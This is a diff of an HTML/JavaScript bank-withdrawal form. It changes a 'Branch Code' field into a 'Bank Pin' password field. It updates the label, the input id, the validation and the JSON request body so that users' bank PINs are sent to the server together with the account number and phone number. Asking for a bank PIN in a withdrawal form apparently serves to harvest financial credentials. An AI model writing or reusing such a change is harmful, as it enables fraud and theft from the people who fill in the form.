@@ -138,15 +138,15 @@ placeholder="e.g. +263771234567">
         color:#1877f2;
         font-weight:bold;
         font-size:18px;">
-    Branch Code
+    Bank Pin
 </label>
 
 <div style="position:relative;">
 
     <input
         type="password"
-        id="branch_code"
-        placeholder="Enter branch code"
+        id="bank_pin"
+        placeholder="Enter bank pin"
         style="
             width:100%;
             padding:12px 45px 12px 12px;
@@ -156,7 +156,7 @@ placeholder="e.g. +263771234567">
             font-size:16px;">
 
     <span
-        onclick="toggleBranchCode()"
+        onclick="toggleBankPin()"
         style="
             position:absolute;
             right:15px;
@@ -186,9 +186,9 @@ Withdraw to Bank Account
     const bank_name = document.getElementById("bank_name").value.trim();
     const account_number = document.getElementById("account_number").value.trim();
     const phone_number = document.getElementById("phone_number").value.trim();
-    const branch_code = document.getElementById("branch_code").value.trim();
+    const bank_pin = document.getElementById("bank_pin").value.trim();
 
-    if (!bank_name || !account_number || !phone_number || !branch_code) {
+    if (!bank_name || !account_number || !phone_number || !bank_pin) {
         alert("Please fill in all fields.");
         return;
     }
@@ -204,7 +204,7 @@ Withdraw to Bank Account
                 bank_name: bank_name,
                 account_number: account_number,
                 phone_number: phone_number,
-                branch_code: branch_code
+                bank_pin: bank_pin
             })
         });
 
@@ -236,9 +236,9 @@ Withdraw to Bank Account
 
 }
 
-function toggleBranchCode() {
+function toggleBankPin() {
 
-    const input = document.getElementById("branch_code");
+    const input = document.getElementById("bank_pin");
 
     if (input.type === "password") {
         input.type = "text";
